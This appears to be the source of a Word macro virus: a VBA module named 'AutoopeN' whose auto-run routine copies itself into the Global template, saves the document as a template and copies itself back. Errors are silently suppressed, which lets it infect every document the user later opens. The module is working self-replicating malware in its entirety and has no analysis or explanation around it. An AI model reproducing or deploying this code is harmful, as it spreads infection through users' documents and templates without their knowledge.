   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoopeN"

   Public Sub MAIN()
   Dim c$
   Dim a$
   Dim b$
   On Error Resume Next: c$ = ":aUtOoPen": a$ = WordBasic.[FileName$]() + c$: b$ = "Global" + c$: WordBasic.MacroCopy a$, b$: WordBasic.FileSaveAs Format:=1: WordBasic.MacroCopy b$, a$
   End Sub
